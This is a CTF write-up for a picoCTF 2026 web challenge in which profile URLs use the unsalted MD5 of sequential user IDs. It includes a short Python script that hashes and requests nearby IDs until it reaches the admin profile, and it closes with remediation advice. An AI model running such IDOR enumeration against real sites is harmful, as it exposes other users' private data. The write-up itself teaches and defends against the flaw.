```markdown
# Hashgate — picoCTF 2026
**Category:** Web Exploitation | **Difficulty:** Medium | **Author:** Yahaya Meddy

## Challenge Description
You have gained access to an organization's portal. Submit your email and password, and it redirects you to your profile. But be careful: just because access to the admin isn't directly exposed doesn't mean it's secure. Maybe someone forgot that obscurity isn't security... Can you find your way into the admin's profile for this organization and capture the flag?

## Recon

- Logged into the portal as a guest user.
- Checked cookies — nothing of interest stored there.
- Viewed page source and found a **guest ID (3000)** embedded in the page.
- After logging in as guest, the app displayed:

  > Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.

- The profile URL looked suspicious:

  ```
  http://crystal-peak.picoctf.net:63406/profile/user/e93028bdc1aacdfb3687181f2031765d
  ```

- Testing confirmed `e93028bdc1aacdfb3687181f2031765d` is the **MD5 hash of `3000`** — the guest's own ID.

## Vulnerability

This is a classic **Insecure Direct Object Reference (IDOR)**.

The application does not perform server-side authorization checks based on session identity. Instead, it "protects" profile access by hashing the numeric user ID with MD5 and using that hash as the URL identifier — assuming an attacker can't reverse it.

The problem: MD5 is a fast, unkeyed, unsalted hash. Since:
- The ID space is small (~20 employees, sequential integers around 3000+),
- There's no per-request authorization check tying the session to the requested resource,

...an attacker doesn't need to *reverse* the hash at all — they can simply *recompute* it for every candidate ID and try each resulting URL. Hashing a low-entropy, guessable value provides no real security; it's obscurity dressed up as cryptography.

## Exploitation

Wrote a script to brute-force IDs in the neighborhood of the known guest ID, hashing each candidate and requesting the corresponding profile:

```python
import hashlib
import requests

url = "http://crystal-peak.picoctf.net:63406/profile/user/"

for i in range(3000, 3100):
    h = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(url + h)

    if "picoCTF" in r.text:
        print("Found:", i)
        print(r.text)
        break
```

Running the script:

```
$ python hashgate.py
Found: 3019
Welcome, admin! Here is the flag: picoCTF{redacted}
```

ID `3019` corresponded to the admin account, whose profile leaked the flag.

## Flag
```
picoCTF{redacted}
```

## Root Cause & Takeaways

- **Hashing an identifier is not access control.** Authorization must be enforced server-side based on the authenticated session (does *this user* own *this* resource?) — not on whether the client can produce the "correct" opaque-looking URL.
- **Unsalted MD5 of low-entropy input is trivially bruteforced.** With only ~20-100 possible IDs, hashing adds negligible protection.
- **Obscurity is not security.** Hiding the real ID behind a hash only raises the bar from "guess the URL" to "guess the URL, then hash it" — a one-line fix for an attacker.
- **Fix:** Enforce role/ownership checks on every resource-access endpoint, independent of how the identifier is represented in the URL.
```